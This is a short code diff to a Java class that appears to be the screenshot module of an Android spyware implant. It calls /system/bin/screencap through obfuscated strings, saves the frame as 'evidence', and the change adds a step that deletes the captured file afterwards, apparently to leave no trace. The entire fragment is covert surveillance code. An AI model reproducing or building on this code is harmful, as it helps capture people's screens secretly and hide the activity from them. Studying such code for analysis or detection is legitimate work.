@@ -167,7 +167,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (!screenCap) {
 			return false;
 		}
-
+		// Questa utility chiama solo una IOCTL
+		// http://forum.xda-developers.com/showpost.php?p=41461956
 		String sc = M.e("/system/bin/screencap");
 		String frame = M.e("/data/data/") + Status.self().getAppContext().getPackageName() + M.e("/files/frame.png");
 
@@ -193,7 +194,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 					EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 					return true;
 				}
-			} finally {
+
+			}finally{
+				aframe.delete();
 				enableClick();
 			}
 		}
